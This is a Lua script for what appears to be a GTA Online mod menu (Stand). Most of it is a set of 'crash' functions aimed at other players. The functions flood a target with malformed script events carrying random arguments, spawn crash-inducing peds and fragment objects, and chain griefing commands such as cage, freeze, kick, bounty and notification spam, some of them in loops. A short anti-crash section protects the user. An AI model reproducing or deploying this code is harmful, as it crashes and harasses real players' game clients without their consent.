    	menu.toggle_loop(tehecrash, "Teheh Crash", {"toggletehe"}, "Stand crashes and trolls all in 1 looped(Laggy).", function(on_toggle)
    	notification("Teheheh sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("bounty".. players.get_name(pid) .. " 10000")
	menu.trigger_commands("ceokick" .. players.get_name(pid))
	menu.trigger_commands("mugloop" .. players.get_name(pid))
	menu.trigger_commands("ring" .. players.get_name(pid))
	menu.trigger_commands("freeze" .. players.get_name(pid))
	menu.trigger_commands("confuse" .. players.get_name(pid))
	menu.trigger_commands("ceokick" .. players.get_name(pid))
	menu.trigger_commands("mugloop" .. players.get_name(pid))
	menu.trigger_commands("freeze" .. players.get_name(pid))
	menu.trigger_commands("confuse" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
                  menu.trigger_commands("steamroll" .. players.get_name(pid))
	menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("notifyspam" .. players.get_name(pid))
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        	local mdl = util.joaat('a_c_poodle')
        		BlockSyncs(pid, function()
            	if request_model(mdl, 2) then
                	local pos = players.get_position(pid)
                	util.yield(1)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(1)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(1)
            else
                	util.toast("Failed to load model. :/")
	notification("Worth it HAHA!!!", colors.red)
            end
        end)
    end)

    local poodlecrash = menu.list(crash, "Poodle Bomb Crash", {}, "")

    menu.action(poodlecrash, "Poodle Bomb Crash", {"poodle"}, "Skidded from Jinx.", function()
        	local mdl = util.joaat('a_c_poodle')
        		BlockSyncs(pid, function()
            	if request_model(mdl, 2) then
                	local pos = players.get_position(pid)
                	util.yield(1)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(1)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(1)
            else
                	util.toast("Failed to load model. :/")
	notification("Worth it HAHA!!!", colors.red)
            end
        end)
    end)

    menu.toggle_loop(poodlecrash, "Poodle Bomb Crash", {"togglepoodle"}, "Skidded from Jinx.", function(on_toggle)
        	local mdl = util.joaat('a_c_poodle')
        		BlockSyncs(pid, function()
            	if request_model(mdl, 2) then
                	local pos = players.get_position(pid)
                	util.yield(1)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(1)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(1)
            else
                	util.toast("Failed to load model. :/")
	notification("Worth it HAHA!!!", colors.red)
            end
        end)
    end)

    local fragcrash = menu.list(crash, "Fragment Crash", {}, "")

    menu.action(fragcrash, "Fragment Crash", {"frag"}, "Skidded From 2take1", function()
        BlockSyncs(pid, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.toggle_loop(fragcrash, "Fragment Crash", {"togglefrag"}, "Skidded From 2take1", function(on_toggle)
        BlockSyncs(pid, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)


local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

    local krustykrab = menu.list(crash, "2take1 Special", {}, "It's risky to spectate using this but your call, works best on 2take1 users")

    local peds = 5
    menu.slider(krustykrab, "Number Of Spatchulas", {"nos2t1"}, "Sends spatchula crash. Note: Flick it to 100 click to crash then flick back to 1 and click again for best results", 1, 100, 1, 1, function(amount)
    notification("2take1 Special sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "2take1 Special", {"2t1spec"}, "It's risky to spectate using this but your call", function(val)
    notification("Sending 2take1 Special to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        crash_toggle = val
        BlockSyncs(pid, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped_pos = players.get_position(pid)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(pid))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)

    local allin1crash = menu.list(crash, "All in1 Crash", {}, "")

    	menu.action(allin1crash, "All in1 Crash", {"allin1"}, "Sends 2t1spec, frag, poodle, pow, skidpow, doge, bozocrash, automob, error, notifyspam, casinotp, mission, ring, cage mugloop and explode all at once. Uses 50 Script different events and other methods.", function()
    	notification("All in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
		util.yield(1000)
	menu.trigger_commands("automob"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("frag"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("bozocrash"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("pow"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("clothescrash"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("pedbang"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("skidpow"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
                  menu.trigger_commands("steamroll" .. players.get_name(pid))
		util.yield(1000)
	menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("doge"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("notifyspam"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("casinotp"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("mission"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("error"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ring"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("cage"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("mugloop"..PLAYER.GET_PLAYER_NAME(pid))
    	notification("Finished All in1 Crash On " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    	menu.toggle_loop(allin1crash, "All in1 Crash", {"toggleallin1"}, "Sends 2t1spec, frag, poodle, pow, skidpow, bozocrash and doge all at once. Uses 50 Script different events and other methods looped.", function(on_toggle)
    	notification("All in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("automob"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("frag"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("bozocrash"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("pow"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("skidpow"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("doge"..PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
    	notification("Finished All in1 Crash On " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    local ncrash = menu.list(crash, "3 in 1 Crash", {}, "")

    	menu.action(ncrash, "3 in 1 Crash", {"3in1"}, "Sends stands elegant, next-gen, burger king foot lettuce and vehicle manslaughter all at once", function(state)
    	notification("3in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettucecrash"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.toggle_loop(ncrash, "3 in 1 Crash", {"toggle3in1"}, "Sends stands elegant, next-gen, burger king foot lettuce and vehicle manslaughter all at once", function(on_toggle)
    	notification("3in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettucecrash"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    local vehcrash = menu.list(crash, "Vehicle Crash", {}, "")

    	menu.action(vehcrash, "Vehicle Crash", {"vehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function()
    	notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
	menu.trigger_commands("killveh" .. players.get_name(pid))
	menu.trigger_commands("poptires" .. players.get_name(pid))
	menu.trigger_commands("removedoors" .. players.get_name(pid))
	menu.trigger_commands("slingshot" .. players.get_name(pid))
	menu.trigger_commands("igniteveh" .. players.get_name(pid))
	menu.trigger_commands("vehkick" .. players.get_name(pid))
	menu.trigger_commands("novehs" .. players.get_name(pid))
	menu.trigger_commands("delveh" .. players.get_name(pid))
	menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
		util.yield(100)
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
    	menu.trigger_commands("2t1" .. PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.toggle_loop(vehcrash, "Vehicle Crash", {"togglevehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function(on_toggle)
    	notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
	menu.trigger_commands("killveh" .. players.get_name(pid))
	menu.trigger_commands("poptires" .. players.get_name(pid))
	menu.trigger_commands("removedoors" .. players.get_name(pid))
	menu.trigger_commands("slingshot" .. players.get_name(pid))
	menu.trigger_commands("igniteveh" .. players.get_name(pid))
	menu.trigger_commands("vehkick" .. players.get_name(pid))
	menu.trigger_commands("novehs" .. players.get_name(pid))
	menu.trigger_commands("delveh" .. players.get_name(pid))
	menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
		util.yield(100)
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
    	menu.trigger_commands("2t1" .. PLAYER.GET_PLAYER_NAME(pid))
    			end)

local function random_args(id, amount)
    local args = {id}
    if not amount or amount == 0 then
        return args
    else
        for i = 2, amount + 1 do
            args[i] = math.random(-2147483647, 2147483647)
        end
        return args
    end
end

    	local acams = menu.list(crash, "Anti Crash Camera's", {}, "")

	menu.action(acams, "Anti Crash Camera On", {"acamon"}, "Activates ped regen, invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and blocks all connections", function()
		notification("Toggling Anti Crash Camera On", colors.blue)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpfemale")
			menu.trigger_commands("tphigh")
			menu.trigger_commands("invisibility" .. " On")
			menu.trigger_commands("levitate" .. " On")
			menu.trigger_commands("freecam" .. " On")
			menu.trigger_commands("potatomode on")
    			menu.trigger_commands("nosky on")
			menu.trigger_commands("reducedcollision" .. " On")
			menu.trigger_commands("nocollision" .. " On")
			menu.trigger_commands("showcamall" .. " On")
			menu.trigger_commands("confuseall" .. " On")
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
		end
	
	end)

	menu.action(acams, "Anti Crash Camera Off", {"acamoff"}, "Deactivates ped regen,invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and unblocks all connections", function()
		notification("Toggling Anti Crash Camera Off", colors.blue)
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
			end
		notification("Force Stopped All Sound Events", colors.green)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
		notification("Removed Attachments", colors.green)
			menu.trigger_commands("mpfemale")
			menu.trigger_commands("tpmyspot")
			menu.trigger_commands("invisibility" .. " Off")
			menu.trigger_commands("levitate" .. " Off")
			menu.trigger_commands("freecam" .. " Off")
			menu.trigger_commands("potatomode off")
			menu.trigger_commands("reducedcollision" .. " Off")
			menu.trigger_commands("nocollision" .. " Off")
			menu.trigger_commands("showcamall" .. " Off")
			menu.trigger_commands("confuseall" .. " Off")
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
			util.toast("Note: Change your outfit in the interaction menu to reset online ped")
		end
	
	end)

